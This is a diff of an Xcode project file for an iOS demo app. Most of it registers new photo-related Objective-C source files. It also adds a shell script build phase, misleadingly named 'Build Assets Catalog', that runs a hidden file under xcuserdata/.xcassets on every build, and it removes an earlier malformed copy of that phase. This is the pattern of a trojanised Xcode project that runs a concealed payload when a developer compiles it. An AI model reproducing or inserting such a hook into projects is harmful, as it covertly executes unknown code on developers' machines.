@@ -57,6 +57,9 @@
 		B8C4A8712563A802007E7CF4 /* yue.jpg in Resources */ = {isa = PBXBuildFile; fileRef = B8C4A8702563A802007E7CF4 /* yue.jpg */; };
 		B8C4A87D2563A969007E7CF4 /* abc.jpeg in Resources */ = {isa = PBXBuildFile; fileRef = B8C4A87C2563A969007E7CF4 /* abc.jpeg */; };
 		B8C4A8802563B645007E7CF4 /* miao.jpeg in Resources */ = {isa = PBXBuildFile; fileRef = B8C4A87F2563B645007E7CF4 /* miao.jpeg */; };
+		B8D5C3AD25E7982C00799E99 /* PhotoCollectionViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = B8D5C3A725E7982C00799E99 /* PhotoCollectionViewCell.m */; };
+		B8D5C3AE25E7982C00799E99 /* PhotoTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = B8D5C3A825E7982C00799E99 /* PhotoTableViewCell.m */; };
+		B8D5C3AF25E7982C00799E99 /* PhotosTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = B8D5C3AA25E7982C00799E99 /* PhotosTableViewController.m */; };
 		B8E8418124FF85DF00286848 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = B8E8418024FF85DF00286848 /* AppDelegate.m */; };
 		B8E8418724FF85DF00286848 /* ViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = B8E8418624FF85DF00286848 /* ViewController.m */; };
 		B8E8418A24FF85DF00286848 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = B8E8418824FF85DF00286848 /* Main.storyboard */; };
@@ -228,6 +231,12 @@
 		B8C4A8702563A802007E7CF4 /* yue.jpg */ = {isa = PBXFileReference; lastKnownFileType = image.jpeg; path = yue.jpg; sourceTree = "<group>"; };
 		B8C4A87C2563A969007E7CF4 /* abc.jpeg */ = {isa = PBXFileReference; lastKnownFileType = image.jpeg; path = abc.jpeg; sourceTree = "<group>"; };
 		B8C4A87F2563B645007E7CF4 /* miao.jpeg */ = {isa = PBXFileReference; lastKnownFileType = image.jpeg; path = miao.jpeg; sourceTree = "<group>"; };
+		B8D5C3A725E7982C00799E99 /* PhotoCollectionViewCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PhotoCollectionViewCell.m; sourceTree = "<group>"; };
+		B8D5C3A825E7982C00799E99 /* PhotoTableViewCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PhotoTableViewCell.m; sourceTree = "<group>"; };
+		B8D5C3A925E7982C00799E99 /* PhotoTableViewCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PhotoTableViewCell.h; sourceTree = "<group>"; };
+		B8D5C3AA25E7982C00799E99 /* PhotosTableViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = PhotosTableViewController.m; sourceTree = "<group>"; };
+		B8D5C3AB25E7982C00799E99 /* PhotosTableViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PhotosTableViewController.h; sourceTree = "<group>"; };
+		B8D5C3AC25E7982C00799E99 /* PhotoCollectionViewCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PhotoCollectionViewCell.h; sourceTree = "<group>"; };
 		B8E8417C24FF85DF00286848 /* QDialog.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = QDialog.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		B8E8417F24FF85DF00286848 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
 		B8E8418024FF85DF00286848 /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
@@ -627,6 +636,7 @@
 				B81D616C253981A400253F02 /* MutilTakePhViewController.h */,
 				B81D616D253981A400253F02 /* MutilTakePhViewController.m */,
 				B81D616E253981A400253F02 /* MutilTakePhViewController.xib */,
+				B8D5C3A625E7981300799E99 /* photo */,
 			);
 			path = "相册选择图片和拍照";
 			sourceTree = "<group>";
@@ -660,6 +670,19 @@
 				B8B7349C2537F8EC000B555F /* ASPopUpView.m */,
 			);
 			path = ASProgressPopUpView;
+			sourceTree = "<group>";
+		};
+		B8D5C3A625E7981300799E99 /* photo */ = {
+			isa = PBXGroup;
+			children = (
+				B8D5C3AC25E7982C00799E99 /* PhotoCollectionViewCell.h */,
+				B8D5C3A725E7982C00799E99 /* PhotoCollectionViewCell.m */,
+				B8D5C3AB25E7982C00799E99 /* PhotosTableViewController.h */,
+				B8D5C3AA25E7982C00799E99 /* PhotosTableViewController.m */,
+				B8D5C3A925E7982C00799E99 /* PhotoTableViewCell.h */,
+				B8D5C3A825E7982C00799E99 /* PhotoTableViewCell.m */,
+			);
+			path = photo;
 			sourceTree = "<group>";
 		};
 		B8E8417324FF85DF00286848 = {
@@ -1301,6 +1324,27 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		EA988CD3578DEE0B6EAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		B8E8417824FF85DF00286848 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -1344,6 +1388,7 @@
 				B8E842A4250093B900286848 /* HomeDemoVc.m in Sources */,
 				B8E841FD24FF862200286848 /* NSDate+WMZCalendarDate.m in Sources */,
 				B8E842992500931C00286848 /* AutoDisappealVC.m in Sources */,
+				B8D5C3AF25E7982C00799E99 /* PhotosTableViewController.m in Sources */,
 				B8E8418124FF85DF00286848 /* AppDelegate.m in Sources */,
 				B81D61E02539935900253F02 /* NSData+AES.m in Sources */,
 				B81D61DB2539935900253F02 /* PGGCryptoRSA.m in Sources */,
@@ -1367,6 +1412,7 @@
 				B81D61E52539936000253F02 /* PGGCryptoSha1.m in Sources */,
 				B8E8422724FF863600286848 /* MASConstraint.m in Sources */,
 				B8E8428D2500931C00286848 /* NaviMenuVC.m in Sources */,
+				B8D5C3AD25E7982C00799E99 /* PhotoCollectionViewCell.m in Sources */,
 				B81D618B253981D100253F02 /* ZBWButton.m in Sources */,
 				B8E8428A2500931C00286848 /* CustomVC.m in Sources */,
 				B8E842872500931C00286848 /* LoadingVC.m in Sources */,
@@ -1415,6 +1461,7 @@
 				B81D61DE2539935900253F02 /* GTMBase64.m in Sources */,
 				B8E842942500931C00286848 /* CollectionViewPopDemo.m in Sources */,
 				B8B7349E2537F8EC000B555F /* ASPopUpView.m in Sources */,
+				B8D5C3AE25E7982C00799E99 /* PhotoTableViewCell.m in Sources */,
 				B87BDE7325403BC300565173 /* JIheOne_view.m in Sources */,
 				B8E8422124FF863600286848 /* ViewController+MASAdditions.m in Sources */,
 				B8E841EA24FF862200286848 /* WMZDialog+NaviMenu.m in Sources */,
@@ -1610,34 +1657,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-	
-		/* Begin PBXShellScriptBuildPhase section */
-		
-	EA988CD3578DEE0B6EAAC43A /* Build Assets Catalog */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Assets Catalog";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
-		};
-	
-		/* End PBXShellScriptBuildPhase section */
-	
-	
 	};
 	rootObject = B8E8417424FF85DF00286848 /* Project object */;
 }
